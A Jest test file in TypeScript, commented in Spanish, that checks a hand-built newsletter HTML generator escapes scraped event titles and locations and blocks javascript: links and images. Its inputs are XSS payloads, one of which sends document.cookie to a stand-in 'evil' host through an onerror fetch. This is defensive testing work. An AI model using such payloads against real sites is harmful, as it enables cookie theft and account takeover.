/**
 * El HTML del newsletter se construye a mano, y eso es exactamente lo que lo
 * hace peligroso.
 *
 * En el resto del proyecto el HTML lo escribe React, que escapa por defecto: un
 * titulo con `"><img src=x onerror=...>` se pinta como texto. Aqui no hay nada
 * que escapa, y los textos vienen de las 28 fuentes que se raspan —`raw.title`
 * solo pasa por `.trim()` en `normalizeRaw`—, asi que lo que se probeaba era un
 * XSSStored contra todos los suscriptores activos, o inyeccion de enlace e
 * imagen para phishing en los clientes que no ejecutan JS.
 *
 * Los tests comprueban las dos capas por separado porque fallan por motivos
 * distintos: `escapeHtml` neutraliza los caracteres que rompen el HTML, y
 * `safeUrl` neutraliza los esquemas ejecutables, que no llevan **ningun**
 * caracter que el escapado toque. Un `href="javascript:alert(1)"` pasa intacto
 * por un escapado correcto.
 */

const enviados: { to: string; subject: string; html: string }[] = [];

jest.mock("../lib/mail", () => ({
  sendMail: jest.fn(async (opts: { to: string; subject: string; html: string }) => {
    enviados.push(opts);
    return { ok: true };
  }),
}));

// eslint-disable-next-line @typescript-eslint/no-require-imports
const { sendWeeklyNewsletter } = require("../lib/email");

// `export {}` convierte este fichero en módulo. Sin él no hay ni un `import` ni un
// `export` de nivel superior, así que TypeScript lo trata como script global y el
// `sendWeeklyNewsletter` de aquí choca con el de `send-newsletter.test.ts`:
// `tsc` complain de "Cannot redeclare block-scoped variable" en los dos ficheros,
// y solo en el compilation de conjunto — `jest` compila cada fichero aislado y no
// lo ve. Es un error que aparece en cuanto hay un segundo fichero de tests.
export {};

/** El HTML de un envio, o un fallo explicito si no se envio nada. */
function htmlDeLaNewsletter(): string {
  expect(enviados).toHaveLength(1);
  return enviados[0].html;
}

beforeEach(() => {
  enviados.length = 0;
});

const FECHA = "2026-10-15T18:00:00.000Z";

describe("escapado del HTML del newsletter", () => {
  it("un titulo con comillas y etiquetas no rompe el atributo alt", async () => {
    await sendWeeklyNewsletter(
      [
        {
          title: '"><img src=x onerror="fetch(\'//evil/\'+document.cookie)">',
          date: FECHA,
        },
      ],
      "alguien@example.com",
      "tok"
    );

    const html = htmlDeLaNewsletter();
    // El atributo sigue siendo un atributo: no hay comilla que lo cierre.
    expect(html).not.toContain('onerror="fetch');
    expect(html).toContain("&quot;&gt;&lt;img");
    // Y el unico `<img>` es el de la plantilla, el de la imagen del evento.
    expect(html.match(/<img/g)?.length ?? 0).toBeLessThanOrEqual(1);
  });

  it("el titulo se escapa tambien como contenido de texto", async () => {
    await sendWeeklyNewsletter(
      [{ title: "<script>alert(1)</script>", date: FECHA }],
      "alguien@example.com",
      "tok"
    );

    const html = htmlDeLaNewsletter();
    expect(html).not.toContain("<script>");
    expect(html).toContain("&lt;script&gt;");
  });

  it("un link con esquema javascript no se convierte en un enlace vivo", async () => {
    await sendWeeklyNewsletter(
      [{ title: "Concierto", date: FECHA, link: "javascript:alert(document.cookie)" }],
      "alguien@example.com",
      "tok"
    );

    const html = htmlDeLaNewsletter();
    // Escapar el HTML no alcanza aqui: `javascript:` no lleva nada que escapar.
    expect(html).not.toMatch(/href="javascript:/i);
    expect(html).toContain('href="#"');
  });

  it("una imagen con esquema javascript no se convierte en un src vivo", async () => {
    await sendWeeklyNewsletter(
      [{ title: "Concierto", date: FECHA, image: "javascript:alert(1)" }],
      "alguien@example.com",
      "tok"
    );

    const html = htmlDeLaNewsletter();
    expect(html).not.toMatch(/src="javascript:/i);
  });

  it("el lugar se escapa", async () => {
    await sendWeeklyNewsletter(
      [{ title: "Concierto", date: FECHA, location: "Teatro </p><script>x</script>" }],
      "alguien@example.com",
      "tok"
    );

    const html = htmlDeLaNewsletter();
    expect(html).not.toContain("<script>x</script>");
    expect(html).toContain("&lt;script&gt;");
  });

  it("las URLs normales siguen funcionando", async () => {
    await sendWeeklyNewsletter(
      [
        {
          title: "Concierto en la sala",
          date: FECHA,
          link: "https://example.com/concierto?a=1&b=2",
          image: "https://example.com/cartel.jpg",
          location: "Sala Jimmy Jazz",
        },
      ],
      "alguien@example.com",
      "tok"
    );

    const html = htmlDeLaNewsletter();
    // El `&` de la query se escapa a `&amp;`, que es lo correcto en un atributo.
    expect(html).toContain('href="https://example.com/concierto?a=1&amp;b=2"');
    expect(html).toContain('src="https://example.com/cartel.jpg"');
    expect(html).toContain('alt="Concierto en la sala"');
    expect(html).toContain("Sala Jimmy Jazz");
    expect(html).toContain('rel="noopener noreferrer"');
  });

  it("mailto: se acepta en un link", async () => {
    await sendWeeklyNewsletter(
      [{ title: "Contacto", date: FECHA, link: "mailto:hola@example.com" }],
      "alguien@example.com",
      "tok"
    );

    expect(htmlDeLaNewsletter()).toContain('href="mailto:hola@example.com"');
  });
});